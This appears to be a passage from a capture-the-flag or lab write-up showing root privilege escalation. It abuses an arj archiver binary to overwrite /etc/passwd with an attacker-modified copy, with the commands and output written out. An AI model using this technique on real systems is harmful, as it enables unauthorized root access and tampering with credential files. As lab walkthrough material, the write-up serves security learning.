# 4 privesc > root

```
$ /usr/bin/arj
ARJ32 v 3.10, Copyright (c) 1998-2004, ARJ Software Russia.

Processing archive: /usr/bin/arj
Archive created: 2019-02-10 14:50:08, modified: 2019-02-10 14:50:08

List of frequently used commands and switches.  Type ARJ -? for more help.

Usage:     ARJ <command> [-<sw> [-<sw>...]] <archive_name> [<file_names>...]
Examples:  ARJ a -e archive, ARJ e archive, ARJ l archive *.doc
<Commands>
 ac: Add Chapter to chapter archive     l: List contents of archive
  a: Add files to archive               m: Move files to archive
  c: Comment archive files              t: Test integrity of archive
  d: Delete files from archive          u: Update files to archive
  e: Extract files from archive         v: Verbosely list contents of archive
  f: Freshen files in archive           x: eXtract files with full pathname
<Switches>
  c: skip time-stamp Check              r: Recurse subdirectories
  e: Exclude paths from names           u: Update files (new and newer)
  f: Freshen existing files             v: enable multiple Volumes
  g: Garble with password               w: assign Work directory
  i: with no progress Indicator         x: eXclude selected files
  m: with Method 0, 1, 2, 3, 4          y: assume Yes on all queries
  n: only New files (not exist)        hk: enable ARJ-PROTECT damage protection
  
# lets overwrite /etc/passwd
# create new passwd with added line

# create archive
$ arj a kashz.x passwd

# confirm
$ arj l kashz.x
ARJ32 v 3.10, Copyright (c) 1998-2004, ARJ Software Russia.

Processing archive: kashz.x
Archive created: 2021-09-05 01:00:09, modified: 2021-09-05 01:00:09
Filename       Original Compressed Ratio DateTime modified Attributes/GUA BPMGS
------------ ---------- ---------- ----- ----------------- -------------- -----
passwd             1483        551 0.372 21-09-05 00:46:51 -rw-r--r-- ---   1
------------ ---------- ---------- -----
     1 files       1483        551 0.372

# extract
$ cd /etc
$ arj e /home/fox/k/kashz.x
[OR]
# from dir where kashz.x is located
$ arj x kashz.x /etc/
```
